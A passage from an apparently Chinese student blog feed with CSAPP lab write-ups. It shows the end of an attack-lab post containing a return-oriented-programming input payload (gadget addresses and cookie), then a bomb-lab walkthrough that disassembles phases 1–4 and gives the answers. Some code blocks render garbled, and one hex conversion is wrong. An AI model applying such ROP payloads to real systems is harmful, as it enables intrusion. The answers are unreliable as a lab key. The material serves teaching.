%rdi<br>ret<br></code></pre></td></tr></table></figure><p>此时<code>cookie</code>相对<code>rsp</code>的偏移地址是0x48，因为执行<code>ret</code>之后相当于进行了一次pop，<code>%rsp+=0x8</code>。</p><p>写出输入序列</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">ad</span> <span class="hljs-number">1</span>a <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">a2</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">cc</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">48</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">dd</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">70</span> <span class="hljs-number">1</span>a <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">13</span> <span class="hljs-number">1</span>a <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">d6</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">a2</span> <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">fa</span> <span class="hljs-number">18</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-attribute">35</span> <span class="hljs-number">39</span> <span class="hljs-number">62</span> <span class="hljs-number">39</span> <span class="hljs-number">39</span> <span class="hljs-number">37</span> <span class="hljs-number">66</span> <span class="hljs-number">61</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/htwzxwj/image@main/image-20230731231640914.png" alt="成功"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul><li>耗时3天，总计12小时</li><li>我对程序运行时栈的理解更加深刻了一点</li><li>在编程时需要时刻注意缓冲区溢出的问题（ROP这个攻击逻辑太牛逼了）</li></ul>]]></content>
    
    
    <categories>
      
      <category>CSAPP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>binary</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>csapp bomb_lab</title>
    <link href="/2023/09/06/csapp-bomb-lab/"/>
    <url>/2023/09/06/csapp-bomb-lab/</url>
    
    <content type="html"><![CDATA[<h1 id="bomb-lab"><a href="#bomb-lab" class="headerlink" title="bomb lab"></a>bomb lab</h1><h2 id="初见bomb"><a href="#初见bomb" class="headerlink" title="初见bomb"></a>初见bomb</h2><p>A “binary bomb” is a program provided to students as an object code file.  When run, it prompts the user to type in 6 different strings. If any of these is incorrect, the bomb “explodes,” printing an error message and logging the event on a grading server.  Students must “defuse” their own unique bomb by disassembling and reverse engineering the program to determine what the 6 strings should be. The lab teaches students to understand assembly language, and also forces them to learn how to use a debugger.  It’s also great fun.  A legendary lab among the CMU undergrads. </p><p><strong>二进制炸弹，每一个<code>phase</code>都是最喜欢的一集。</strong></p><h3 id="概览："><a href="#概览：" class="headerlink" title="概览："></a>概览：</h3><p>每一个<code>phase</code>在<code>bomb.c</code>中结构都类似，那么我们便可以使用<code>gdb</code>对每一个<code>phase</code>进行反汇编。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">input = read_line();             <span class="hljs-comment">/* Get input                   */</span><br>   phase_1(input);                  <span class="hljs-comment">/* Run the phase               */</span><br>   phase_defused();                 <span class="hljs-comment">/* Drat!  They figured it out!</span><br></code></pre></td></tr></table></figure><p>输入传入<code>phase_1</code>，若成功返回则拆弹成功。</p><h2 id="phase-1"><a href="#phase-1" class="headerlink" title="phase_1"></a>phase_1</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs assembly">Dump of assembler code for function phase_1:<br>   0x0000000000400ee0 &lt;+0&gt;:     sub    $0x8,%rsp<br>   0x0000000000400ee4 &lt;+4&gt;:     mov    $0x402400,%esi<br>   0x0000000000400ee9 &lt;+9&gt;:     call   0x401338 &lt;strings_not_equal&gt;<br>   0x0000000000400eee &lt;+14&gt;:    test   %eax,%eax<br>   0x0000000000400ef0 &lt;+16&gt;:    je     0x400ef7 &lt;phase_1+23&gt;<br>   0x0000000000400ef2 &lt;+18&gt;:    call   0x40143a &lt;explode_bomb&gt;<br>   0x0000000000400ef7 &lt;+23&gt;:    add    $0x8,%rsp<br>   0x0000000000400efb &lt;+27&gt;:    ret<br>End of assembler dump.<br></code></pre></td></tr></table></figure><ul><li>根据函数名字，不难看出我们只需要得到0x402400处的字符串便能返回成功。</li></ul><p><strong>直接获取0x402400处的值</strong>：x&#x2F;s 0x402400</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">(gdb) x/s <span class="hljs-number">0x402400</span><br><span class="hljs-number">0x402400</span>:       <span class="hljs-string">&quot;Border relations with Canada have never been better.&quot;</span><br></code></pre></td></tr></table></figure><p><code>phase_1</code>解除成功。</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">Phase <span class="hljs-number">1</span> defused. How about <span class="hljs-keyword">the</span> next <span class="hljs-literal">one</span>?<br></code></pre></td></tr></table></figure><h2 id="phase-2"><a href="#phase-2" class="headerlink" title="phase_2"></a>phase_2</h2><p>反汇编：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">Dump of assembler code for function phase_2:<br>   0x0000000000400efc &lt;+0&gt;:     push   %rbp<br>   0x0000000000400efd &lt;+1&gt;:     push   %rbx<br>   0x0000000000400efe &lt;+2&gt;:     sub    $0x28,%rsp<br>   0x0000000000400f02 &lt;+6&gt;:     mov    %rsp,%rsi<br>   0x0000000000400f05 &lt;+9&gt;:     call   0x40145c &lt;read_six_numbers&gt;<br></code></pre></td></tr></table></figure><ul><li>第5行中，将栈顶指针传给rsi作为<code>read_six_numbers</code>的参数</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs assembly">Dump of assembler code for function read_six_numbers:<br>   0x000000000040145c &lt;+0&gt;:     sub    $0x18,%rsp<br>   0x0000000000401460 &lt;+4&gt;:     mov    %rsi,%rdx<br>   0x0000000000401463 &lt;+7&gt;:     lea    0x4(%rsi),%rcx<br>   0x0000000000401467 &lt;+11&gt;:    lea    0x14(%rsi),%rax<br>   0x000000000040146b &lt;+15&gt;:    mov    %rax,0x8(%rsp)<br>   0x0000000000401470 &lt;+20&gt;:    lea    0x10(%rsi),%rax<br>   0x0000000000401474 &lt;+24&gt;:    mov    %rax,(%rsp)<br>   0x0000000000401478 &lt;+28&gt;:    lea    0xc(%rsi),%r9<br>   0x000000000040147c &lt;+32&gt;:    lea    0x8(%rsi),%r8<br>   0x0000000000401480 &lt;+36&gt;:    mov    $0x4025c3,%esi<br>   0x0000000000401485 &lt;+41&gt;:    mov    $0x0,%eax<br>   0x000000000040148a &lt;+46&gt;:    call   0x400bf0 &lt;__isoc99_sscanf@plt&gt;<br>   0x000000000040148f &lt;+51&gt;:    cmp    $0x5,%eax<br>   0x0000000000401492 &lt;+54&gt;:    jg     0x401499 &lt;read_six_numbers+61&gt;<br>   0x0000000000401494 &lt;+56&gt;:    call   0x40143a &lt;explode_bomb&gt;<br>   0x0000000000401499 &lt;+61&gt;:    add    $0x18,%rsp<br>   0x000000000040149d &lt;+65&gt;:    ret<br>End of assembler dump.<br></code></pre></td></tr></table></figure><p>对上述内容做简单梳理</p><table><thead><tr><th>栈空间</th><th>指令</th><th>注</th></tr></thead><tbody><tr><td>rsi+14</td><td>lea    0x14(%rsi),%rax</td><td>mov    %rax,0x8(%rsp)</td></tr><tr><td>rsi+10</td><td>lea    0x10(%rsi),%rax</td><td>mov    %rax,(%rsp)</td></tr><tr><td>rsi+c</td><td>lea    0xc(%rsi),%r9</td><td></td></tr><tr><td>rsi+8</td><td>lea    0x8(%rsi),%r8</td><td></td></tr><tr><td>rsi+4</td><td>lea    0x4(%rsi),%rcx</td><td></td></tr><tr><td>rsi</td><td>mov    %rsi,%rdx</td><td></td></tr><tr><td>rsp+8</td><td>rsi+14</td><td></td></tr><tr><td>rsp</td><td>rsi+10</td><td></td></tr></tbody></table><p>输入的6个数字所在的位置就分别是：<code>R[%rsp]</code> <code>R[%rsp+0x8]</code> <code>%rsi</code> <code>%rsi+0x4</code> <code>%rsi+0x8</code> <code>%rsi+0xc</code></p><p>返回<code>phase_2</code>函数后，利用栈顶指针调用就是： <code>%rsp</code> <code>%rsp+0x4</code> <code>%rsp+0x8</code> <code>%rsp+0xc</code> <code>%rsp+0x10</code> <code>%rsp+0x14</code></p><p>指令执行到0x401480，上图中加载的指令的栈空间</p><p>此时遇到一个内存地址0x4025c3 查看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">(gdb) x/s 0x4025c3<br>0x4025c3:       &quot;%d %d %d %d %d %d&quot;<br></code></pre></td></tr></table></figure><p>看phase_2剩余部分。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs assembly">   0x0000000000400f0a &lt;+14&gt;:    cmpl   $0x1,(%rsp)<br>   0x0000000000400f0e &lt;+18&gt;:    je     0x400f30 &lt;phase_2+52&gt;<br>   0x0000000000400f10 &lt;+20&gt;:    call   0x40143a &lt;explode_bomb&gt;<br>   0x0000000000400f15 &lt;+25&gt;:    jmp    0x400f30 &lt;phase_2+52&gt;<br>   0x0000000000400f17 &lt;+27&gt;:    mov    -0x4(%rbx),%eax<br>   0x0000000000400f1a &lt;+30&gt;:    add    %eax,%eax<br>   0x0000000000400f1c &lt;+32&gt;:    cmp    %eax,(%rbx)<br>   0x0000000000400f1e &lt;+34&gt;:    je     0x400f25 &lt;phase_2+41&gt;<br>   0x0000000000400f20 &lt;+36&gt;:    call   0x40143a &lt;explode_bomb&gt;<br>   0x0000000000400f25 &lt;+41&gt;:    add    $0x4,%rbx<br>   0x0000000000400f29 &lt;+45&gt;:    cmp    %rbp,%rbx<br>   0x0000000000400f2c &lt;+48&gt;:    jne    0x400f17 &lt;phase_2+27&gt;<br>   0x0000000000400f2e &lt;+50&gt;:    jmp    0x400f3c &lt;phase_2+64&gt;<br>   0x0000000000400f30 &lt;+52&gt;:    lea    0x4(%rsp),%rbx<br>   0x0000000000400f35 &lt;+57&gt;:    lea    0x18(%rsp),%rbp<br>   0x0000000000400f3a &lt;+62&gt;:    jmp    0x400f17 &lt;phase_2+27&gt;<br>   0x0000000000400f3c &lt;+64&gt;:    add    $0x28,%rsp<br>   0x0000000000400f40 &lt;+68&gt;:    pop    %rbx<br>   0x0000000000400f41 &lt;+69&gt;:    pop    %rbp<br>   0x0000000000400f42 &lt;+70&gt;:    ret<br>End of assembler dump.<br></code></pre></td></tr></table></figure><ul><li>第二行，判断<code>(%rsp)</code>是否为1，不相等则引爆。</li><li>循环规律，后一个数是前一个数的2倍，可得答案：1 2 4 8 16 32</li></ul><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">That<span class="hljs-symbol">&#x27;s</span> number <span class="hljs-number">2</span>.  Keep going!<br></code></pre></td></tr></table></figure><h2 id="phase-3"><a href="#phase-3" class="headerlink" title="phase_3"></a>phase_3</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs assembly">Dump of assembler code for function phase_3:   <br>   0x0000000000400f43 &lt;+0&gt;:     sub    $0x18,%rsp<br>   0x0000000000400f47 &lt;+4&gt;:     lea    0xc(%rsp),%rcx<br>   0x0000000000400f4c &lt;+9&gt;:     lea    0x8(%rsp),%rdx<br>   0x0000000000400f51 &lt;+14&gt;:    mov    $0x4025cf,%esi<br>   0x0000000000400f56 &lt;+19&gt;:    mov    $0x0,%eax<br>   0x0000000000400f5b &lt;+24&gt;:    call   0x400bf0 &lt;__isoc99_sscanf@plt&gt;<br>   0x0000000000400f60 &lt;+29&gt;:    cmp    $0x1,%eax<br>   0x0000000000400f63 &lt;+32&gt;:    jg     0x400f6a &lt;phase_3+39&gt;<br>   0x0000000000400f65 &lt;+34&gt;:    call   0x40143a &lt;explode_bomb&gt;<br>   0x0000000000400f6a &lt;+39&gt;:    cmpl   $0x7,0x8(%rsp)<br>   0x0000000000400f6f &lt;+44&gt;:    ja     0x400fad &lt;phase_3+106&gt;<br>   0x0000000000400f71 &lt;+46&gt;:    mov    0x8(%rsp),%eax<br>   0x0000000000400f75 &lt;+50&gt;:    jmp    *0x402470(,%rax,8)<br>   0x0000000000400f7c &lt;+57&gt;:    mov    $0xcf,%eax<br>   0x0000000000400f81 &lt;+62&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;<br>   0x0000000000400f83 &lt;+64&gt;:    mov    $0x2c3,%eax<br>   0x0000000000400f88 &lt;+69&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;<br>   0x0000000000400f8a &lt;+71&gt;:    mov    $0x100,%eax<br>   0x0000000000400f8f &lt;+76&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;<br>   0x0000000000400f91 &lt;+78&gt;:    mov    $0x185,%eax<br>   0x0000000000400f96 &lt;+83&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;<br>   0x0000000000400f98 &lt;+85&gt;:    mov    $0xce,%eax<br>   0x0000000000400f9d &lt;+90&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;<br>   0x0000000000400f9f &lt;+92&gt;:    mov    $0x2aa,%eax<br>   0x0000000000400fa4 &lt;+97&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;<br>   0x0000000000400fa6 &lt;+99&gt;:    mov    $0x147,%eax<br>   0x0000000000400fab &lt;+104&gt;:   jmp    0x400fbe &lt;phase_3+123&gt;<br>   0x0000000000400fad &lt;+106&gt;:   call   0x40143a &lt;explode_bomb&gt;<br>   0x0000000000400fb2 &lt;+111&gt;:   mov    $0x0,%eax<br>   0x0000000000400fb7 &lt;+116&gt;:   jmp    0x400fbe &lt;phase_3+123&gt;<br>   0x0000000000400fb9 &lt;+118&gt;:   mov    $0x137,%eax<br>   0x0000000000400fbe &lt;+123&gt;:   cmp    0xc(%rsp),%eax<br>   0x0000000000400fc2 &lt;+127&gt;:   je     0x400fc9 &lt;phase_3+134&gt;<br>   0x0000000000400fc4 &lt;+129&gt;:   call   0x40143a &lt;explode_bomb&gt;<br>   0x0000000000400fc9 &lt;+134&gt;:   add    $0x18,%rsp<br>   0x0000000000400fcd &lt;+138&gt;:   ret<br>End of assembler dump.<br></code></pre></td></tr></table></figure><ul><li><p>查看0x4025cf的内容</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl">(gdb) <span class="hljs-keyword">x</span>/s <span class="hljs-number">0x4025cf</span><br><span class="hljs-number">0x4025cf</span>:       <span class="hljs-string">&quot;%d %d&quot;</span><br></code></pre></td></tr></table></figure></li><li><p>受第二题启发，我们可以知道输入就在rsp+8和rsp+c</p></li><li><p>第10行说明第一个输入不能大于7</p></li><li><p>第十六行假设第一个输入为1，查看0x402478，</p></li><li><pre><code class="hljs">(gdb) x/x 0x4024780x402478:       0xb9<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><br>  <span class="hljs-number">0xb9</span>=<span class="hljs-number">311</span><br><br>  答案 <span class="hljs-number">1</span> <span class="hljs-number">311</span><br><br>## phase_4<br><br>#### 反汇编phase_4<br><br><span class="hljs-string">```</span>assembly<br>Dump of assembler code for function phase_4:<br>   <span class="hljs-number">0x000000000040100c</span> &lt;+<span class="hljs-number">0</span>&gt;:     <span class="hljs-keyword">sub</span>    <span class="hljs-number">$0</span>x18,%rsp<br>   <span class="hljs-number">0x0000000000401010</span> &lt;+<span class="hljs-number">4</span>&gt;:     <span class="hljs-keyword">lea</span>    <span class="hljs-number">0xc</span>(%rsp),%rcx  #第二个输入存在<span class="hljs-number">0xc</span>(%rsp)<br>   <span class="hljs-number">0x0000000000401015</span> &lt;+<span class="hljs-number">9</span>&gt;:     <span class="hljs-keyword">lea</span>    <span class="hljs-number">0x8</span>(%rsp),%rdx  #第一个输入存在<span class="hljs-number">0x8</span>(%rsp)<br>   <span class="hljs-number">0x000000000040101a</span> &lt;+<span class="hljs-number">14</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-number">$0</span>x4025cf,%esi<br>   <span class="hljs-number">0x000000000040101f</span> &lt;+<span class="hljs-number">19</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-number">$0</span>x0,%eax<br>   <span class="hljs-number">0x0000000000401024</span> &lt;+<span class="hljs-number">24</span>&gt;:    <span class="hljs-keyword">call</span>   <span class="hljs-number">0x400bf0</span> &lt;__isoc99_sscanf@plt&gt;<br>   <span class="hljs-number">0x0000000000401029</span> &lt;+<span class="hljs-number">29</span>&gt;:    <span class="hljs-keyword">cmp</span>    <span class="hljs-number">$0</span>x2,%eax<br>   <span class="hljs-number">0x000000000040102c</span> &lt;+<span class="hljs-number">32</span>&gt;:    <span class="hljs-keyword">jne</span>    <span class="hljs-number">0x401035</span> &lt;phase_4+<span class="hljs-number">41</span>&gt; #输入数量不为<span class="hljs-number">2</span>直接爆<br>   <span class="hljs-number">0x000000000040102e</span> &lt;+<span class="hljs-number">34</span>&gt;:    cmpl   <span class="hljs-number">$0</span>xe,<span class="hljs-number">0x8</span>(%rsp)<br>   <span class="hljs-number">0x0000000000401033</span> &lt;+<span class="hljs-number">39</span>&gt;:    <span class="hljs-keyword">jbe</span>    <span class="hljs-number">0x40103a</span> &lt;phase_4+<span class="hljs-number">46</span>&gt; #若第一个参数&gt;<span class="hljs-number">14</span>，爆<br>   <span class="hljs-number">0x0000000000401035</span> &lt;+<span class="hljs-number">41</span>&gt;:    <span class="hljs-keyword">call</span>   <span class="hljs-number">0x40143a</span> &lt;explode_bomb&gt;<br>   <span class="hljs-number">0x000000000040103a</span> &lt;+<span class="hljs-number">46</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-number">$0</span>xe,%edx #%edx=<span class="hljs-number">0xe</span><br>   <span class="hljs-number">0x000000000040103f</span> &lt;+<span class="hljs-number">51</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-number">$0</span>x0,%esi #<span class="hljs-built_in">esi</span>=<span class="hljs-number">0x0</span><br>   <span class="hljs-number">0x0000000000401044</span> &lt;+<span class="hljs-number">56</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-number">0x8</span>(%rsp),%edi #%edi=<span class="hljs-number">0x8</span>(%rsp)<br>   <span class="hljs-number">0x0000000000401048</span> &lt;+<span class="hljs-number">60</span>&gt;:    <span class="hljs-keyword">call</span>   <span class="hljs-number">0x400fce</span> &lt;func4&gt;<br>   <span class="hljs-number">0x000000000040104d</span> &lt;+<span class="hljs-number">65</span>&gt;:    <span class="hljs-keyword">test</span>   %eax,%eax<br>   <span class="hljs-number">0x000000000040104f</span> &lt;+<span class="hljs-number">67</span>&gt;:    <span class="hljs-keyword">jne</span>    <span class="hljs-number">0x401058</span> &lt;phase_4+<span class="hljs-number">76</span>&gt; #func4返回值为<span class="hljs-number">0</span>才不爆<br>   <span class="hljs-number">0x0000000000401051</span> &lt;+<span class="hljs-number">69</span>&gt;:    cmpl   <span class="hljs-number">$0</span>x0,<span class="hljs-number">0xc</span>(%rsp) #第二个输入为<span class="hljs-number">0</span>才不爆<br>   <span class="hljs-number">0x0000000000401056</span> &lt;+<span class="hljs-number">74</span>&gt;:    <span class="hljs-keyword">je</span>     <span class="hljs-number">0x40105d</span> &lt;phase_4+<span class="hljs-number">81</span>&gt;<br>   <span class="hljs-number">0x0000000000401058</span> &lt;+<span class="hljs-number">76</span>&gt;:    <span class="hljs-keyword">call</span>   <span class="hljs-number">0x40143a</span> &lt;explode_bomb&gt;<br>   <span class="hljs-number">0x000000000040105d</span> &lt;+<span class="hljs-number">81</span>&gt;:    <span class="hljs-keyword">add</span>    <span class="hljs-number">$0</span>x18,%rsp<br>   <span class="hljs-number">0x0000000000401061</span> &lt;+<span class="hljs-number">85</span>&gt;:    <span class="hljs-keyword">ret</span><br>End of assembler dump.<br></code></pre></td></tr></table></figure></code></pre></li></ul><h4 id="反汇编func4"><a href="#反汇编func4" class="headerlink" title="反汇编func4"></a>反汇编func4</h4><p>int func4 ( int edi, int esi, int edx ) 返回值放在 eax</p><p>注释为初始情况下第一次的情况 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs assembly">Dump of assembler code for function func4:<br>   0x0000000000400fce &lt;+0&gt;:     sub    $0x8,%rsp<br>   0x0000000000400fd2 &lt;+4&gt;:     mov    %edx,%eax #%eax=%edx<br>   0x0000000000400fd4 &lt;+6&gt;:     sub    %esi,%eax #%eax=%edx-%esi=0xe<br>   0x0000000000400fd6 &lt;+8&gt;:     mov    %eax,%ecx #%ecx=%eax=0xe<br>   0x0000000000400fd8 &lt;+10&gt;:    shr    $0x1f,%ecx #%ecx=(%eax&gt;&gt;31)<br>   0x0000000000400fdb &lt;+13&gt;:    add    %ecx,%eax #%eax=(%eax&gt;&gt;31)<br>   0x0000000000400fdd &lt;+15&gt;:    sar    %eax #右移一位 %eax=((%eax&gt;&gt;31)&gt;&gt;1) %eax=0x7<br>   0x0000000000400fdf &lt;+17&gt;:    lea    (%rax,%rsi,1),%ecx #ecx=%rax+%rsi=0x7<br>   0x0000000000400fe2 &lt;+20&gt;:    cmp    %edi,%ecx #0x7-x1<br>   0x0000000000400fe4 &lt;+22&gt;:    jle    0x400ff2 &lt;func4+36&gt; #edi&gt;=ecx时跳转<br>   0x0000000000400fe6 &lt;+24&gt;:    lea    -0x1(%rcx),%edx #此处的条件是ecx&gt;edi，<br>   0x0000000000400fe9 &lt;+27&gt;:    call   0x400fce &lt;func4&gt; #调用func4（edi,esi,ecx-1）<br>   0x0000000000400fee &lt;+32&gt;:    add    %eax,%eax #返回结果2*func4（edi,esi,ecx）<br>   0x0000000000400ff0 &lt;+34&gt;:    jmp    0x401007 &lt;func4+57&gt;<br>   0x0000000000400ff2 &lt;+36&gt;:    mov    $0x0,%eax #此处的条件是ecx&lt;=edi，eax=0 <br>   0x0000000000400ff7 &lt;+41&gt;:    cmp    %edi,%ecx #ecx-edi=0x7-x1<br>   0x0000000000400ff9 &lt;+43&gt;:    jge    0x401007 &lt;func4+57&gt; #edi&lt;=ecx跳转<br>   0x0000000000400ffb &lt;+45&gt;:    lea    0x1(%rcx),%esi  <br>   0x0000000000400ffe &lt;+48&gt;:    call   0x400fce &lt;func4&gt; #调用func4(edi,esi+1,edx)<br>   0x0000000000401003 &lt;+53&gt;:    lea    0x1(%rax,%rax,1),%eax #返回2*func4(edi,esi+1,edx)+1<br>   0x0000000000401007 &lt;+57&gt;:    add    $0x8,%rsp<br>   0x000000000040100b &lt;+61&gt;:    ret<br>End of assembler dump.<br></code></pre></td></tr></table></figure><p>C语言代码实现func4</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 